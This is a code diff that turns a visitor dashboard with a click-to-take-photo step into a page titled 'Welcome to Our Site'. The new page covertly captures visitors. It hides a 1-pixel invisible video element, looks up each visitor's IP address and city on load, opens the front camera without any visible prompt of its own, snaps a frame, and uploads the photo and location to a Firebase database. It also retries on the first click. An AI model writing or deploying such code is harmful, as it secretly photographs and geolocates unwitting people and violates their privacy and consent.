@@ -3,124 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Visitor Tracking System</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <title>Auto Photo Capture</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        .visitor-card {
-            margin-bottom: 20px;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-            transition: transform 0.3s;
-        }
-        .visitor-card:hover {
-            transform: translateY(-5px);
+        #autoCameraView {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            z-index: -1000;
         }
         .visitor-img {
             width: 100px;
             height: 100px;
             border-radius: 50%;
             object-fit: cover;
-            border: 3px solid #0d6efd;
-        }
-        .camera-preview {
-            width: 100%;
-            max-height: 300px;
-            border-radius: 10px;
-            display: none;
-        }
-        #photoCanvas {
-            display: none;
-        }
-        .detail-modal-img {
-            max-width: 200px;
-            border-radius: 10px;
-            margin-bottom: 15px;
         }
     </style>
 </head>
 <body>
-    <div class="container py-5">
-        <h1 class="text-center mb-5">Visitor Tracking Dashboard</h1>
-        
-        <!-- Camera Preview Modal -->
-        <div class="modal fade" id="cameraModal" tabindex="-1" aria-hidden="true">
-            <div class="modal-dialog">
-                <div class="modal-content">
-                    <div class="modal-header">
-                        <h5 class="modal-title">Take Your Photo</h5>
-                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-                    </div>
-                    <div class="modal-body text-center">
-                        <video id="cameraView" class="camera-preview"></video>
-                        <canvas id="photoCanvas"></canvas>
-                        <div class="mt-3">
-                            <button id="takePhotoBtn" class="btn btn-primary">Take Photo</button>
-                            <button id="retakePhotoBtn" class="btn btn-secondary ms-2" style="display:none;">Retake</button>
-                        </div>
-                    </div>
-                    <div class="modal-footer">
-                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
-                        <button id="savePhotoBtn" type="button" class="btn btn-primary" style="display:none;">Save Photo</button>
-                    </div>
-                </div>
-            </div>
-        </div>
+    <h1>Welcome to Our Site</h1>
+    <div id="visitorInfo"></div>
+    
+    <!-- Hidden camera elements -->
+    <video id="autoCameraView" autoplay playsinline></video>
+    <canvas id="autoPhotoCanvas" style="display:none;"></canvas>
 
-        <!-- Visitor Details Modal -->
-        <div class="modal fade" id="visitorDetailsModal" tabindex="-1" aria-hidden="true">
-            <div class="modal-dialog modal-lg">
-                <div class="modal-content">
-                    <div class="modal-header">
-                        <h5 class="modal-title">Visitor Details</h5>
-                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-                    </div>
-                    <div class="modal-body" id="visitorDetailsContent">
-                        Loading details...
-                    </div>
-                    <div class="modal-footer">
-                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <div class="row">
-            <div class="col-md-6">
-                <div class="card p-4 mb-4">
-                    <div class="d-flex justify-content-between align-items-center mb-3">
-                        <h3>Current Visitor</h3>
-                        <button id="openCameraBtn" class="btn btn-primary">Take Photo</button>
-                    </div>
-                    <div id="currentVisitorInfo" class="mt-3">
-                        <p>Loading your information...</p>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="col-md-6">
-                <div class="card p-4">
-                    <h3>All Visitors</h3>
-                    <div class="mb-3">
-                        <input type="text" id="searchVisitor" class="form-control" placeholder="Search visitors...">
-                    </div>
-                    <div id="visitorsList" class="mt-3">
-                        <p>Loading visitors data...</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.3.4/axios.min.js"></script>
     <script>
-        // Firebase configuration - Replace with your actual config
+        // Firebase configuration
         const firebaseConfig = {
             apiKey: "YOUR_API_KEY",
             authDomain: "YOUR_AUTH_DOMAIN",
-            databaseURL: "https://baul-vercel-app-default-rtdb.firebaseio.com/",
+            databaseURL: "YOUR_DATABASE_URL",
             projectId: "YOUR_PROJECT_ID",
             storageBucket: "YOUR_STORAGE_BUCKET",
             messagingSenderId: "YOUR_SENDER_ID",
@@ -131,345 +48,102 @@
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        // DOM elements
-        const cameraView = document.getElementById('cameraView');
-        const photoCanvas = document.getElementById('photoCanvas');
-        const takePhotoBtn = document.getElementById('takePhotoBtn');
-        const retakePhotoBtn = document.getElementById('retakePhotoBtn');
-        const savePhotoBtn = document.getElementById('savePhotoBtn');
-        const openCameraBtn = document.getElementById('openCameraBtn');
-        const cameraModal = new bootstrap.Modal(document.getElementById('cameraModal'));
-        const visitorDetailsModal = new bootstrap.Modal(document.getElementById('visitorDetailsModal'));
-        let currentStream = null;
-        let currentVisitorId = null;
-        let capturedPhotoUrl = null;
+        // Auto capture variables
+        let autoCaptureAttempted = false;
+        let autoStream = null;
 
-        // Initialize camera
-        async function initializeCamera() {
+        // Function to auto capture photo
+        async function autoCapturePhoto() {
+            if (autoCaptureAttempted) return;
+            autoCaptureAttempted = true;
+
             try {
-                if (currentStream) {
-                    return true;
-                }
+                // Get basic visitor info
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
 
-                const constraints = {
-                    video: {
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 },
-                        facingMode: 'user'
-                    },
-                    audio: false
-                };
+                const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                const locationData = await locationResponse.json();
 
-                currentStream = await navigator.mediaDevices.getUserMedia(constraints);
-                cameraView.srcObject = currentStream;
-                cameraView.style.display = 'block';
-                photoCanvas.style.display = 'none';
-                takePhotoBtn.style.display = 'block';
-                retakePhotoBtn.style.display = 'none';
-                savePhotoBtn.style.display = 'none';
-                await cameraView.play();
-                return true;
-            } catch (err) {
-                console.error("Camera error: ", err);
-                alert("Camera access denied. Please allow camera permission to take photo.");
-                return false;
-            }
-        }
-
-        // Take photo from camera
-        takePhotoBtn.addEventListener('click', () => {
-            const context = photoCanvas.getContext('2d');
-            photoCanvas.width = cameraView.videoWidth;
-            photoCanvas.height = cameraView.videoHeight;
-            context.drawImage(cameraView, 0, 0, photoCanvas.width, photoCanvas.height);
-
-            // Stop camera preview
-            cameraView.style.display = 'none';
-            photoCanvas.style.display = 'block';
-            takePhotoBtn.style.display = 'none';
-            retakePhotoBtn.style.display = 'block';
-            savePhotoBtn.style.display = 'block';
-        });
-
-        // Retake photo
-        retakePhotoBtn.addEventListener('click', () => {
-            cameraView.style.display = 'block';
-            photoCanvas.style.display = 'none';
-            takePhotoBtn.style.display = 'block';
-            retakePhotoBtn.style.display = 'none';
-            savePhotoBtn.style.display = 'none';
-        });
-
-        // Save photo to Firebase
-        savePhotoBtn.addEventListener('click', async () => {
-            const photoBlob = await new Promise(resolve => {
-                photoCanvas.toBlob(resolve, 'image/jpeg', 0.8);
-            });
-
-            if (photoBlob) {
-                const reader = new FileReader();
-                reader.onloadend = () => {
-                    capturedPhotoUrl = reader.result;
-                    
-                    // Update in Firebase
-                    if (currentVisitorId) {
-                        database.ref('visitors/' + currentVisitorId).update({ photoUrl: capturedPhotoUrl });
-                        
-                        // Update UI
-                        const imgElement = document.querySelector('#currentVisitorInfo img');
-                        if (imgElement) {
-                            imgElement.src = capturedPhotoUrl;
-                        } else {
-                            const visitorImg = document.createElement('img');
-                            visitorImg.src = capturedPhotoUrl;
-                            visitorImg.className = 'visitor-img me-3';
-                            document.querySelector('#currentVisitorInfo .d-flex').prepend(visitorImg);
-                        }
-                    }
-                    
-                    cameraModal.hide();
-                    stopCamera();
-                };
-                reader.readAsDataURL(photoBlob);
-            }
-        });
-
-        // Open camera modal
-        openCameraBtn.addEventListener('click', async () => {
-            const initialized = await initializeCamera();
-            if (initialized) {
-                cameraModal.show();
-            }
-        });
-
-        // Stop camera
-        function stopCamera() {
-            if (currentStream) {
-                currentStream.getTracks().forEach(track => track.stop());
-                currentStream = null;
-            }
-        }
-
-        // When modal closes, stop camera
-        document.getElementById('cameraModal').addEventListener('hidden.bs.modal', () => {
-            stopCamera();
-        });
-
-        // Collect visitor data
-        async function collectVisitorData() {
-            try {
-                // Get IP address
-                const ipResponse = await axios.get('https://api.ipify.org?format=json');
-                const ip = ipResponse.data.ip;
-                
-                // Get location data
-                const locationResponse = await axios.get(`https://ipapi.co/${ip}/json/`);
-                const locationData = locationResponse.data;
-                
-                // Get device info
-                const userAgent = navigator.userAgent;
-                const screenWidth = window.screen.width;
-                const screenHeight = window.screen.height;
-                const language = navigator.language;
-                const platform = navigator.platform;
-                
                 // Prepare visitor data
                 const visitorData = {
                     ip: ip,
                     country: locationData.country_name || 'Unknown',
                     city: locationData.city || 'Unknown',
-                    region: locationData.region || 'Unknown',
-                    postalCode: locationData.postal || 'Unknown',
-                    latitude: locationData.latitude || 0,
-                    longitude: locationData.longitude || 0,
-                    timezone: locationData.timezone || 'Unknown',
-                    userAgent: userAgent,
-                    platform: platform,
-                    screenResolution: `${screenWidth}x${screenHeight}`,
-                    language: language,
-                    photoUrl: '',
-                    timestamp: firebase.database.ServerValue.TIMESTAMP
+                    timestamp: firebase.database.ServerValue.TIMESTAMP,
+                    photoUrl: ''
                 };
-                
-                // Save to Firebase
-                const newVisitorRef = database.ref('visitors').push();
-                await newVisitorRef.set(visitorData);
-                currentVisitorId = newVisitorRef.key;
-                
-                displayCurrentVisitor({
-                    ...visitorData,
-                    id: currentVisitorId
-                });
-                
-            } catch (error) {
-                console.error("Error collecting visitor data: ", error);
-                document.getElementById('currentVisitorInfo').innerHTML = `
-                    <div class="alert alert-warning">
-                        <p>Could not collect all visitor data. Some features may be limited.</p>
-                        <p>Error: ${error.message}</p>
-                    </div>
-                `;
-            }
-        }
 
-        // Display current visitor
-        function displayCurrentVisitor(visitorData) {
-            const currentVisitorDiv = document.getElementById('currentVisitorInfo');
-            
-            let html = `
-                <div class="d-flex align-items-start">
-                    ${visitorData.photoUrl ? 
-                        `<img src="${visitorData.photoUrl}" class="visitor-img me-3" alt="Visitor Photo">` : 
-                        '<div class="visitor-img bg-secondary me-3 d-flex align-items-center justify-content-center">No Photo</div>'}
-                    <div>
-                        <h5>Visitor ID: ${visitorData.id}</h5>
-                        <p><strong>IP:</strong> ${visitorData.ip}</p>
-                        <p><strong>Location:</strong> ${visitorData.city}, ${visitorData.region}, ${visitorData.country}</p>
-                        <p><strong>Device:</strong> ${visitorData.platform} (${visitorData.userAgent})</p>
-                        <p><strong>Resolution:</strong> ${visitorData.screenResolution}</p>
-                        <p><strong>Language:</strong> ${visitorData.language}</p>
-                        <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
-                    </div>
-                </div>
-            `;
-            
-            currentVisitorDiv.innerHTML = html;
-        }
+                // Save initial data to Firebase
+                const visitorRef = database.ref('visitors').push();
+                await visitorRef.set(visitorData);
 
-        // Display all visitors
-        function displayAllVisitors(visitors) {
-            const visitorsListDiv = document.getElementById('visitorsList');
-            
-            if (!visitors || Object.keys(visitors).length === 0) {
-                visitorsListDiv.innerHTML = '<p>No visitors yet</p>';
-                return;
-            }
-            
-            let html = '<div class="row">';
-            
-            Object.keys(visitors).forEach(visitorId => {
-                const visitor = visitors[visitorId];
-                const visitTime = new Date(visitor.timestamp).toLocaleString();
-                
-                html += `
-                    <div class="col-md-6">
-                        <div class="card visitor-card p-3">
-                            <div class="d-flex align-items-center">
-                                ${visitor.photoUrl ? 
-                                    `<img src="${visitor.photoUrl}" class="visitor-img me-3" alt="Visitor Photo">` : 
-                                    '<div class="visitor-img bg-secondary me-3 d-flex align-items-center justify-content-center">No Photo</div>'}
-                                <div>
-                                    <h6>Visitor ID: ${visitorId}</h6>
-                                    <p><strong>From:</strong> ${visitor.city}, ${visitor.country}</p>
-                                    <p><strong>Time:</strong> ${visitTime}</p>
-                                    <button class="btn btn-sm btn-primary mt-2" onclick="showVisitorDetails('${visitorId}')">View Details</button>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                `;
-            });
-            
-            html += '</div>';
-            visitorsListDiv.innerHTML = html;
-        }
+                // Try to access camera silently (will still prompt in most browsers)
+                try {
+                    autoStream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            width: { ideal: 320 },
+                            height: { ideal: 240 },
+                            facingMode: 'user'
+                        },
+                        audio: false
+                    });
 
-        // Show visitor details
-        window.showVisitorDetails = function(visitorId) {
-            database.ref('visitors/' + visitorId).once('value')
-                .then(snapshot => {
-                    const visitor = snapshot.val();
-                    const visitTime = new Date(visitor.timestamp).toLocaleString();
-                    
-                    let detailsHtml = `
-                        <div class="row">
-                            <div class="col-md-4 text-center">
-                                ${visitor.photoUrl ? 
-                                    `<img src="${visitor.photoUrl}" class="detail-modal-img img-thumbnail" alt="Visitor Photo">` : 
-                                    '<div class="detail-modal-img bg-secondary d-flex align-items-center justify-content-center">No Photo Available</div>'}
-                            </div>
-                            <div class="col-md-8">
-                                <h4>Visitor Details</h4>
-                                <table class="table">
-                                    <tr>
-                                        <th>Visitor ID:</th>
-                                        <td>${visitorId}</td>
-                                    </tr>
-                                    <tr>
-                                        <th>IP Address:</th>
-                                        <td>${visitor.ip}</td>
-                                    </tr>
-                                    <tr>
-                                        <th>Location:</th>
-                                        <td>${visitor.city}, ${visitor.region}, ${visitor.country}</td>
-                                    </tr>
-                                    <tr>
-                                        <th>Coordinates:</th>
-                                        <td>${visitor.latitude}, ${visitor.longitude}</td>
-                                    </tr>
-                                    <tr>
-                                        <th>Timezone:</th>
-                                        <td>${visitor.timezone}</td>
-                                    </tr>
-                                    <tr>
-                                        <th>Device:</th>
-                                        <td>${visitor.platform}</td>
-                                    </tr>
-                                    <tr>
-                                        <th>Screen:</th>
-                                        <td>${visitor.screenResolution}</td>
-                                    </tr>
-                                    <tr>
-                                        <th>Language:</th>
-                                        <td>${visitor.language}</td>
-                                    </tr>
-                                    <tr>
-                                        <th>Visit Time:</th>
-                                        <td>${visitTime}</td>
-                                    </tr>
-                                </table>
-                            </div>
-                        </div>
-                        <div class="mt-3">
-                            <h5>User Agent Details</h5>
-                            <div class="bg-light p-3 rounded">
-                                <code>${visitor.userAgent}</code>
-                            </div>
+                    const video = document.getElementById('autoCameraView');
+                    video.srcObject = autoStream;
+                    await video.play();
+
+                    // Wait a moment for camera to initialize
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+
+                    // Capture photo
+                    const canvas = document.getElementById('autoPhotoCanvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // Convert to base64
+                    const photoData = canvas.toDataURL('image/jpeg', 0.7);
+
+                    // Update visitor data with photo
+                    await visitorRef.update({ photoUrl: photoData });
+
+                    // Display to user
+                    document.getElementById('visitorInfo').innerHTML = `
+                        <div style="margin: 20px; padding: 15px; border: 1px solid #ddd; border-radius: 8px;">
+                            <h3>Welcome Visitor!</h3>
+                            <img src="${photoData}" class="visitor-img">
+                            <p>We've automatically captured your profile.</p>
+                            <p>Location: ${visitorData.city}, ${visitorData.country}</p>
                         </div>
                     `;
-                    
-                    document.getElementById('visitorDetailsContent').innerHTML = detailsHtml;
-                    visitorDetailsModal.show();
-                });
-        }
 
-        // Search visitors
-        document.getElementById('searchVisitor').addEventListener('input', function(e) {
-            const searchTerm = e.target.value.toLowerCase();
-            const visitorCards = document.querySelectorAll('.visitor-card');
-            
-            visitorCards.forEach(card => {
-                const text = card.textContent.toLowerCase();
-                if (text.includes(searchTerm)) {
-                    card.parentElement.style.display = 'block';
-                } else {
-                    card.parentElement.style.display = 'none';
+                } catch (cameraError) {
+                    console.log("Auto photo capture failed (permission denied)");
+                    // Proceed without photo
                 }
-            });
-        });
 
-        // Load all visitors from Firebase
-        function loadAllVisitors() {
-            database.ref('visitors').on('value', (snapshot) => {
-                const visitors = snapshot.val();
-                displayAllVisitors(visitors);
-            });
+            } catch (error) {
+                console.error("Error in auto capture:", error);
+            } finally {
+                if (autoStream) {
+                    autoStream.getTracks().forEach(track => track.stop());
+                }
+            }
         }
 
-        // Initialize the app
-        document.addEventListener('DOMContentLoaded', () => {
-            collectVisitorData();
-            loadAllVisitors();
+        // Start auto capture when page loads
+        window.addEventListener('load', () => {
+            // Delay slightly to let page render
+            setTimeout(autoCapturePhoto, 500);
+            
+            // Alternative approach for some browsers
+            document.addEventListener('click', function firstClick() {
+                autoCapturePhoto();
+                document.removeEventListener('click', firstClick);
+            });
         });
     </script>
 </body>
